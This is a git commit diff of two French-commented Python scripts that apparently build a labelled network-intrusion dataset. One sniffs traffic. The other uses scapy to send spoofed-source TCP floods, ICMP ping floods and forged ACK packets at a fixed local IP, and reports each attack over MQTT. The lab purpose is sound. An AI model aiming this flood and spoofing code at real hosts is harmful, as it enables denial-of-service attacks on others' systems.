7029eb2fb0b6b82bcad46a703114185685ad27cc
KaleiGan <50327541+KaleiGan@users.noreply.github.com>
2024-04-20 00:46:33 +0200

    add Mosquitto MQTT

--- collect_data_network.py
+++ collect_data_network.py
@@ -1,3 +1,4 @@
+import time
 from class_functions import calculate_entropy  # Assurez-vous que cette fonction existe et est correctement importée
 from scapy.all import sniff, IP, TCP, UDP, ICMP
 import datetime
@@ -7,22 +8,32 @@ import threading
 import csv
 import os
 import asyncio
-import websockets
+import paho.mqtt.client as mqtt
 
-current_attack_type = "Normal"  # Variable globale pour suivre le type d'attaque actuel
 
-async def update_attack_type(websocket, path):
+current_attack_type = "Normal"  # Variable globale pour suivre le type d'attaque
+active_attacks = Counter()  # Utilise un compteur pour suivre les types d'attaques actifs
+
+def on_connect(client, userdata, flags, rc):
+    print("Connected with result code "+str(rc))
+    client.subscribe("attack/type")
+
+def on_message(client, userdata, msg):
     global current_attack_type
-    async for message in websocket:
-        if '_end' in message:
-            current_attack_type = "Normal"
-        else:
-            current_attack_type = message.replace('_start', '')
-        print(f"Updated attack type to: {current_attack_type}")
+    message = msg.payload.decode()
+    attack_info = message.split(':')
+    attack_type, attack_id, status = attack_info
 
-async def start_websocket_server():
-    async with websockets.serve(update_attack_type, "localhost", 8765):
-        await asyncio.Future()  # Run indefinitely
+    if 'start' in status:
+        active_attacks[attack_id] = attack_type  # Enregistrer le type d'attaque sous son UUID
+    elif 'end' in status and attack_id in active_attacks:
+        del active_attacks[attack_id]  # Supprimer l'attaque de la liste active
+
+    # Mettre à jour la chaîne des types d'attaques actifs basée sur les UUID uniques
+    current_attack_types = set(active_attacks.values())
+    current_attack_type = ', '.join(current_attack_types) if current_attack_types else "Normal"
+    print(f"Updated attack types to: {current_attack_type}")
+
 
 
 class NetworkDataCollector:
@@ -120,21 +131,25 @@ def start_sniffing(collector):
 
 # Fonction principale pour démarrer le serveur et la capture
 def main():
-    collector = NetworkDataCollector()
-    thread = threading.Thread(target=start_sniffing, args=(collector,))
-    thread.start()  # Démarrer la capture dans un thread séparé
+    collector = NetworkDataCollector(window_size=300, filename='network_data.csv')
+    thread = threading.Thread(target=collector.start_capture)
+    thread.start()
 
-    loop = asyncio.get_event_loop()
-    ws_server = loop.create_task(start_websocket_server())
+    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1)
+    client.on_connect = on_connect
+    client.on_message = on_message
+
     try:
-        loop.run_forever()
-    except KeyboardInterrupt:
-        print("Shutting down.")
+        client.connect("192.168.1.18", 1883)  # Assurez-vous que l'adresse IP est correcte
+        client.loop_forever()
+        while True:
+            time.sleep(0.1)
+    except Exception as e:
+        print(f"An error occurred: {e}")
     finally:
-        ws_server.cancel()
-        loop.run_until_complete(ws_server)
-        loop.close()
-        thread.join()  # Assurez-vous que le thread de capture termine proprement
+        client.loop_stop()
+        client.disconnect()
+        thread.join()
 
 if __name__ == "__main__":
     main()
--- simulation_attacks.py
+++ simulation_attacks.py
@@ -1,54 +1,68 @@
-import asyncio
-import websockets
 import random
-from scapy.all import IP, TCP, send, ICMP
 from time import sleep
+import paho.mqtt.client as mqtt
+from scapy.all import IP, TCP, send, ICMP
+import uuid
 
-async def send_attack_notification(attack_type, is_start=True):
-    uri = "ws://localhost:8765"
-    message = f"{attack_type}{'_start' if is_start else '_end'}"
-    try:
-        async with websockets.connect(uri) as websocket:
-            await websocket.send(message)
-            print(f"Sent notification for {message}")
-    except Exception as e:
-        print(f"Could not connect to WebSocket server. Is the server running at {uri}?")
-        print("Error:", e)
 
-async def simulate_attack(target_ip):
-    attack_type = random.choice(['ddos', 'ping_flood'])
-    print(f"Simulating {attack_type.upper()} attack")
-    attack_codes = {'ddos': 0xC0, 'ping_flood': 0xC2}
+def on_connect(client, userdata, flags, rc):
+    print("Connected with result code "+str(rc))
 
-    try:
-        await send_attack_notification(attack_type, is_start=True)
+client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
+client.on_connect = on_connect
+client.connect("192.168.1.18", 1883, 60)
 
-        num_packets = random.randint(500, 10000) if attack_type == 'ddos' else random.randint(100, 2000)
+def send_attack_notification(attack_type, attack_id, is_start=True):
+    message = f"{attack_type}:{attack_id}{':start' if is_start else ':end'}"
+    client.publish("attack/type", message)
+    print(f"Sent notification for {message}")
 
-        if attack_type == 'ddos':
-            for _ in range(num_packets):
-                spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
-                packet = IP(src=spoofed_ip, dst=target_ip, tos=attack_codes[attack_type])/TCP(dport=random.randint(1, 65535))
-                send(packet, verbose=0)
-        elif attack_type == 'ping_flood':
-            for _ in range(num_packets):
-                packet = IP(dst=target_ip, tos=attack_codes[attack_type])/ICMP()
-                send(packet, verbose=0)
-    finally:
-        # Ensure the attack end notification is sent even if the script is interrupted
-        await send_attack_notification(attack_type, is_start=False)
+def simulate_attack(target_ip):
+    attack_type = random.choice(['ddos', 'ping_flood', 'mitm'])
+    attack_id = str(uuid.uuid4())  # Générer un ID unique pour cette attaque
+    print(f"Simulating {attack_type.upper()} attack with ID {attack_id}")
+
+    send_attack_notification(attack_type, attack_id, is_start=True)
+
+    if attack_type == 'ddos':
+        nombre_paquets = random.randint(100, 5000)
+        print(nombre_paquets)
+        for _ in range(nombre_paquets):
+            spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
+            packet = IP(src=spoofed_ip, dst=target_ip)/TCP(dport=random.randint(1, 65535))
+            send(packet, verbose=0)
+
+    elif attack_type == 'ping_flood':
+        nombre_paquets = random.randint(100, 2000)
+        print("Simulating Ping Flood")
+        for _ in range(nombre_paquets):  # Augmente le nombre de pings pour simuler un flood
+            packet = IP(dst=target_ip) / ICMP()
+            send(packet, verbose=0)
+
+    elif attack_type == "mitm":
+        random_number = random.randint(1, 253)
+        victim_ip = f"192.168.3.{random_number}"
+        nombre_paquets = random.randint(50, 500)
+        for _ in range(nombre_paquets):
+            spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
+            # Falsification des adresses IP pour imiter l'IP de la victime
+            if random.random() > 0.5:
+                packet = IP(src=victim_ip, dst=target_ip) / TCP(flags="A", seq=random.randint(1000, 10000),
+                                                                ack=random.randint(1000, 10000))
+            else:
+                packet = IP(src=target_ip, dst=victim_ip) / TCP(flags="A", seq=random.randint(1000, 10000),
+                                                                ack=random.randint(1000, 10000))
+            send(packet, verbose=0)
+
+    send_attack_notification(attack_type, attack_id, is_start=False)
 
 if __name__ == "__main__":
     target_ip = "192.168.1.18"
     try:
         while True:
-            asyncio.run(simulate_attack(target_ip))
-            sleep_time = random.randint(10, 60)
+            simulate_attack(target_ip)
+            sleep_time = random.randint(45, 120)
             print(f"Waiting {sleep_time} seconds before next attack")
             sleep(sleep_time)
     except KeyboardInterrupt:
-        print("Interrupt received, stopping attacks.")
-        asyncio.run(send_attack_notification("normal", is_start=False))
-    except Exception as e:
-        print(f"An unexpected error occurred: {e}")
-        asyncio.run(send_attack_notification("normal", is_start=False))
+        print("Simulation stopped by user.")
